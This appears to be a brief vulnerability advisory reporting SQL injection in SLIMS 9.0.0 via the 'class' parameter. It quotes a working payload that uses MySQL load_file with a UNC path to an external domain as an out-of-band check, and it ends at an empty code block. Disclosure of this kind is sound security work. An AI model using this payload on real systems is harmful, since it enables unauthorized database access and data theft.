## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.0.0/SQLi

## Description:
The manual insertion `point 3` with the `class` parameter appears to be vulnerable to SQL injection attacks. 
The payload '+(select load_file('\\\\0absu0byc9uwy8ivftx7f6auul0fo5cwfk6at2hr.again.com\\fbe'))+' was submitted in manual insertion point 3. 
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed.

## STATUS: HIGH Vulnerability

```MySQL
